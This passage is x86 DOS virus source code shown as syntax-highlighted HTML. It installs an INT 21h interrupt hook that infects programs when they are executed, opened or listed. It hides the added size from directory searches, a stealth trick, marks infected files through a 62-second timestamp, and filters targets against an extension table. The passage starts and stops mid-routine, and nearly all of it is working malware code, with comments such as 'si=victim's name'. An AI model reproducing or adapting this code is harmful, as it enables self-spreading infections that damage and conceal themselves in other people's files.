&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cli &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;turn interrupts off<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; sp,word ptr cs:[si+6] &nbsp; ;restore stack ptr<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ss,word ptr cs:[si+4] &nbsp; ;restore stack seg<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; sti &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;turn interrupts back on<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jmp &nbsp; &nbsp; dword ptr cs:[si] &nbsp; &nbsp; &nbsp; ;execute host file as expected<br/>
<br/>
;--- Virus INT 21h Handler --------------------------------<br/>
<br/>
install_check:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; inc &nbsp; &nbsp; ax&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;AX=0 if install check<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iret&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;and RET<br/>
<br/>
New_21:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,0FFFFh &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;installation check?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short install_check &nbsp; &nbsp; ;respond to installation check<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ah,4Bh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;execute program?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short exec_prog &nbsp; &nbsp; &nbsp; &nbsp; ;attempt infection, then execute<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ah,11h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;find first?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short find_file &nbsp; &nbsp; &nbsp; &nbsp; ;find, then attempt infection<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ah,12h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;find next?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short find_file &nbsp; &nbsp; &nbsp; &nbsp; ;find, then attempt infection<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; ax,3D00h&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;open a file?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jne &nbsp; &nbsp; short call_DOS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;otherwise, let DOS process INT<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; infect_file &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;attempt to infect opened file<br/>
<br/>
call_DOS:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; db&nbsp; &nbsp; &nbsp; 0EAh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;JMP to<br/>
int21_vec &nbsp; &nbsp; &nbsp; dd&nbsp; &nbsp; &nbsp; '</span>SKSK<span style="color: #7f007f;">'&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ; original INT 21h<br/>
<br/>
find_file:<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; bp<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; bp,sp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;look on stack<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; word ptr [bp+4],'</span>SK<span style="color: #7f007f;">'&nbsp; &nbsp; ;Is it Lezbo searching?<br/>
XAX &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; equ &nbsp; &nbsp; $-2<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; pop &nbsp; &nbsp; bp<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; jb&nbsp; &nbsp; &nbsp; short call_DOS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;let DOS handle if Lezbo searches<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Int_21h &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;if not Lezbo, continue virus<br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; ax<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; bx<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; dx<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; push&nbsp; &nbsp; es<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; ah,2Fh&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ;get DTA<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; call&nbsp; &nbsp; Int_21h<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; cmp &nbsp; &nbsp; byte ptr es:[bx],0FFh &nbsp; ;is this an extended FCB?<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; je&nbsp; &nbsp; &nbsp; short Not_Extended_FCB&nbsp; ;jump if it'</span>s <span style="color: #00007f; font-weight: bold;">not</span><span style="color: #339933;">,</span> otherwise<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">7</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;convert to normal FCB</span><br/>
<br/>
Not_Extended_FCB<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">1Eh</span><span style="color: black;">&#93;</span> <span style="color: black; font-style: italic;">;minutes of last write</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;mask out seconds</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">1Fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;62 seconds?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short exit_find &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;exit, it's infected</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get file size</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span>offset virus_end<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jl</span>&nbsp; &nbsp; &nbsp; short exit_find &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;something's wrong.. jump out</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dword</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">24h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">eax</span> &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;store new size</span><br/>
<br/>
exit_find<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">iret</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;return to caller</span><br />
<br />
exec_prog<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; infect_it &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;infect whatever it is...</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short call_DOS&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; and do real interrupt</span><br />
<br />
infect_file<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;save registers</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">dx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;si=victim's name</span><br />
<br />
extension<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;scan filename for extension</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">or</span>&nbsp; &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">al</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;look at al</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; short no_ext<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">'.'</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short extension<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span>offset ext_table<span style="color: #339933;">-</span><span style="color: #ff0000;">3</span> &nbsp; <span style="color: black; font-style: italic;">;look at extension table</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;es=cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;next extension in table</span><br />
<br />
next_ext<span style="color: #339933;">:</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;present extension in table</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #ff0000;">3</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;point to next ext in table</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
<br />
look_ext<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lodsb</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get first byte of extension</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">and</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">5Fh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">di</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; <span style="color: black; font-style: italic;">;same?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jne</span> &nbsp; &nbsp; short wrong_ext &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;wrong extension. try another</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;next char in extension</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; look_ext&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get it</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; infect_it<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">sp</span><span style="color: #339933;">,</span><span style="color: #ff0000;">6</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> &nbsp; &nbsp; short no_ext<br />
<br />
wrong_ext<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">loop</span>&nbsp; &nbsp; next_ext&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;try next extension</span><br />
<br />
no_ext<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">ret</span><br />
<br />
infect_it<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">4300h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get file attributes</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; Int_21h<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; short cant_inf<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;store attribs on stack</span><br />
